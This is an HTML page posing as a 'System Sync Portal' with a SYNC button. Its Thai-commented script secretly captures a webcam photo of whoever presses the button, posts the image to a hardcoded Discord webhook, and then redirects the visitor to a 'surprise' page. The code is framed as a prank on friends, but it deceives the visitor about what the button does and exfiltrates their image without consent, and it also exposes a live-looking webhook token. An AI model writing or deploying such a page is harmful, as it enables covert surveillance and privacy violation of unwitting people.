<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Sync Portal</title>
    <style>
        body { background: #0d0f14; color: #e2e8f0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .btn-sync { width: 180px; height: 180px; border-radius: 50%; border: 5px solid #242836; background: transparent; color: #00e5a0; font-weight: bold; font-size: 20px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; outline: none; position: relative; }
        .spinning { border-top: 5px solid #00e5a0 !important; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { margin-top: 25px; font-size: 14px; color: #5a6585; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <h2>CORE SYSTEM</h2>
    <p>Press to Sync Data & Access Portal</p>
    
    <button id="mainBtn" class="btn-sync" onclick="executeSync()">SYNC</button>
    <div id="status">STATUS: READY</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // 1. ใส่ Webhook Discord ของพี่ชาย
        const DISCORD_URL = "https://discord.com/api/webhooks/1500111213328203869/QZDJ3xjC3ZVGjX8zvLJsfOQacT7zaxpUBqBCezfiTKS0QZ9ur_aHAFERTU_En1Jxhnes";
        
        // 2. ใส่ลิงก์เว็บ Surprise ที่อยากให้เพื่อนไปโผล่
        const SURPRISE_URL = "https://hhh444-ai.github.io/xzy-store/home.html"; // ตัวอย่าง: Rickroll

        async function executeSync() {
            const mainBtn = document.getElementById('mainBtn');
            const statusText = document.getElementById('status');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            mainBtn.classList.add('spinning');
            mainBtn.innerText = ""; 
            statusText.innerText = "REDIRECTING TO SECURE PORTAL...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 480, height: 360 } });
                video.srcObject = stream;

                setTimeout(() => {
                    canvas.width = 480;
                    canvas.height = 360;
                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);

                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('file', blob, 'surprise_log.jpg');
                        formData.append('payload_json', JSON.stringify({
                            content: "📸 **Surprise!** เพื่อนกดเข้าเว็บมาแล้ว รูปอยู่ด้านบน!"
                        }));

                        // ส่งรูปไป Discord
                        try {
                            await fetch(DISCORD_URL, { method: 'POST', body: formData });
                        } catch (e) {}

                        // ปิดกล้อง
                        stream.getTracks().forEach(track => track.stop());

                        // วาร์ปเพื่อนไปหน้าเว็บ Surprise ทันที!
                        window.location.href = SURPRISE_URL;

                    }, 'image/jpeg', 0.3);
                }, 400); 

            } catch (err) {
                // ถ้าเพื่อนไม่อนุญาตกล้อง ก็ยังส่งวาร์ปไปอยู่ดี (แต่ไม่มีรูป)
                window.location.href = SURPRISE_URL;
            }
        }
    </script>
</body>
</html>
